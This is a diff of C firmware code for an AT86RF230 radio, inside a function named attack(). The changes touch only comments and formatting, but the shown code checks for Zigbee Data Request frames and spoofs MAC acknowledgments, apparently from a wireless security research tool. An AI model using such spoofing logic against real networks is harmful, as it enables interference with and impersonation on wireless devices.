@@ -43,7 +43,7 @@ bool attack(void)
 	/* Check the length of the received packet */
 	phy_len = spi_recv();
 	if ((phy_len < 5) || (phy_len & 0x80)) {
-		/* Ignore packets with invalid PHY Length */
+		/* Ignore packets with invalid length */
 		spi_end();
 		return 1;
 	}
@@ -133,7 +133,7 @@ bool attack(void)
 		_delay_us(32);
 		spi_recv();
 
-		/* Make sure that it is a Data Request command */
+		/* Make sure that it is a Data Request */
 		_delay_us(32);
 		if (spi_recv() != 0x04) {
 			spi_end();
@@ -153,7 +153,7 @@ bool attack(void)
 		/* Wait for the transmission of the spoofed packet */
 		_delay_us(128);
 
-		/* Spoof a MAC Acknowledgment packet */
+		/* Spoof a MAC acknowledgment */
 		spi_begin();
 		spi_send(AT86RF230_BUF_WRITE);
 		spi_send(5);
@@ -295,18 +295,18 @@ bool attack(void)
 	}
 
 	/*
-	 * Compute the payload length of the NWK command
+	 * Compute the payload length of the NWK command.
 	 * The constant 38 was derived by summing the following:
-	 * 12: Processed bytes
-	 *  2: NWK Short Destination Address
-	 *  2: NWK Short Source Address
-	 *  1: NWK Radius
-	 *  1: NWK Sequence Number
-	 * 14: NWK Auxiliary Header
-	 *  1: NWK Command Identifier
-	 *  4: NWK Message Integrity Code
-	 *  2: MAC Frame Check Sequence
-	 * -1: PHY Length
+	 *   12: Processed bytes
+	 *    2: NWK Short Destination Address
+	 *    2: NWK Short Source Address
+	 *    1: NWK Radius
+	 *    1: NWK Sequence Number
+	 *   14: NWK Auxiliary Header
+	 *    1: NWK Command Identifier
+	 *    4: NWK Message Integrity Code
+	 *    2: MAC Frame Check Sequence
+	 *   -1: PHY Length
 	 */
 	nwk_cmd_len = phy_len - (expected_bytes + 38);
 
